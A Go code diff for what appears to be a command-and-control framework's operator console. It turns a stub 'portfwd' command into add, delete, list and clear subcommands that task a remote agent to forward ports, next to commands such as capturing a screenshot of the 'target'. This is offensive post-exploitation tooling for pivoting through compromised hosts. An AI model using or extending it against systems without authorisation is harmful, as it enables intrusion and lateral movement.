@@ -199,17 +199,6 @@ func RegisterNewCommands(c *grumble.Context, agentid string) {
 	})
 
 	c.App.AddCommand(&grumble.Command{
-		Name: "portfwd",
-		Help: "forward a port",
-		Args: func(a *grumble.Args) {
-			// to be added
-		},
-		Run: func(c *grumble.Context) error {
-			return nil
-		},
-	})
-
-	c.App.AddCommand(&grumble.Command{
 		Name: "screenshot",
 		Help: "capture a screenshot of target",
 		Run: func(c *grumble.Context) error {
@@ -233,6 +222,57 @@ func RegisterNewCommands(c *grumble.Context, agentid string) {
 		},
 		Run: func(c *grumble.Context) error {
 			return SendTask(agentid, "cd", c.Args.String("path"))
+		},
+	})
+
+	portFwdCmd := &grumble.Command{
+		Name: "portfwd",
+		Help: "forward a port",
+	}
+	c.App.AddCommand(portFwdCmd)
+
+	portFwdCmd.AddCommand(&grumble.Command{
+		Name: "add",
+		Help: "add port forwarding rule",
+		Flags: func(f *grumble.Flags) {
+			f.String("l", "lport", "", "local port of the machine to listen on")
+			f.String("p", "rport", "", "remote port to forward to")
+			f.String("r", "rhost", "", "host to forward to")
+		},
+		Run: func(c *grumble.Context) error {
+			lport := c.Flags.String("lport")
+			rport := c.Flags.String("rport")
+			rhost := c.Flags.String("rhost")
+			return SendTask(agentid, "portfwd", "add / "+lport+" / "+rport+" / "+rhost)
+		},
+	})
+
+	portFwdCmd.AddCommand(&grumble.Command{
+		Name: "del",
+		Help: "delete port forwarding rule",
+		Flags: func(f *grumble.Flags) {
+			f.String("i", "id", "", "id of the port fowarding rule")
+		},
+		Run: func(c *grumble.Context) error {
+			id := c.Flags.String("id")
+			return SendTask(agentid, "portfwd", "del / "+id)
+		},
+	})
+
+	portFwdCmd.AddCommand(&grumble.Command{
+		Name: "list",
+		Help: "list all port forwarding rules",
+		Run: func(c *grumble.Context) error {
+			return SendTask(agentid, "portfwd", "list")
+		},
+	})
+
+	portFwdCmd.AddCommand(&grumble.Command{
+		Name:    "clear",
+		Help:    "clear all port forwarding rules",
+		Aliases: []string{"flush"},
+		Run: func(c *grumble.Context) error {
+			return SendTask(agentid, "portfwd", "clear")
 		},
 	})
 }
